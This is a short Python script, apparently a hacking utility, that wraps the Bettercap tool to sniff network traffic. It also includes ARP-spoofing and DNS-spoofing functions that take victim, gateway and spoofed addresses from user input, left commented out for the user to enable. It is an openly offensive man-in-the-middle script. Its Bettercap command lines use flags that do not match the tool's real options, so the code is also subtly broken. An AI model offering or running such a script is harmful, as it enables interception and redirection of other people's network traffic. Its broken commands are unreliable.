import os

def sniff_with_bettercap(interface):
    # Start sniffing with Bettercap
    print("Starting sniffing with Bettercap...")
    os.system(f"bettercap -iface {interface}")

def arp_spoof(target_ip, gateway_ip):
    # Perform ARP spoofing with Bettercap
    print("Performing ARP spoofing with Bettercap...")
    os.system(f"bettercap -iface {interface} -target {target_ip} -gateway {gateway_ip}")

def dns_spoof(target_ip, spoofed_ip):
    # Perform DNS spoofing with Bettercap
    print("Performing DNS spoofing with Bettercap...")
    os.system(f"bettercap -iface {interface} -target {target_ip} -dns {spoofed_ip}")

# Prompt the user to enter the network interface to sniff on
interface = input("Enter the network interface to sniff on (e.g., eth0): ")

# Start sniffing
sniff_with_bettercap(interface)

# Uncomment the following lines to enable additional functions

# Prompt the user to enter the target and gateway IP addresses for ARP spoofing
# target_ip = input("Enter the target IP address for ARP spoofing: ")
# gateway_ip = input("Enter the gateway IP address for ARP spoofing: ")
# arp_spoof(target_ip, gateway_ip)

# Prompt the user to enter the target IP address and the IP to spoof for DNS spoofing
# target_ip = input("Enter the target IP address for DNS spoofing: ")
# spoofed_ip = input("Enter the IP to spoof for DNS spoofing: ")
# dns_spoof(target_ip, spoofed_ip)
